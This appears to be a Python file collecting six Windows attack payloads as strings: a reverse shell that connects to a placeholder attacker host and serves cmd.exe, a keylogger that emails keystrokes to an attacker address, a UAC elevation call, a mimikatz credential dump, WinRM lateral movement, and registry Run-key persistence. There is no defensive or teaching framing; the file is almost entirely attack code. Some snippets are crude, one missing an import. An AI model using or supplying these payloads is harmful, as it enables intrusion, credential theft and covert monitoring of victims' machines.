import os
import subprocess

# Payload 1: Windows Reverse Shell
payload1 = r'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["cmd.exe"])
'''

# Payload 2: Windows Keylogger
payload2 = r'''
import pyHook, pythoncom, smtplib

def OnKeyboardEvent(event):
    email_body = str(event.Key)
    email_subject = "Keystrokes"
    msg = 'Subject: {}\n\n{}'.format(email_subject, email_body)
    s = smtplib.SMTP('localhost')
    s.sendmail('victim@example.com', 'attacker@example.com', msg)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
'''

# Payload 3: Windows Privilege Escalation
payload3 = r'''
import ctypes

# Elevate to admin privileges
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
'''

# Payload 4: Windows Credential Dumper
payload4 = r'''
import subprocess
import os

# Dump credentials using mimikatz
subprocess.call(["mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords", "exit"])
'''

# Payload 5: Windows Lateral Movement
payload5 = r'''
import winrm

# Connect to remote host and execute commands
session = winrm.Session('remote_host', auth=('username', 'password'))
response = session.run_cmd('command', ['arg1', 'arg2'])
print(response.std_out)
'''

# Payload 6: Windows Persistence
payload6 = r'''
import winreg

# Add registry key for persistence
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
winreg.SetValueEx(key, "Payload", 0, winreg.REG_SZ, r"C:\path\to\payload.exe")
winreg.CloseKey(key)
'''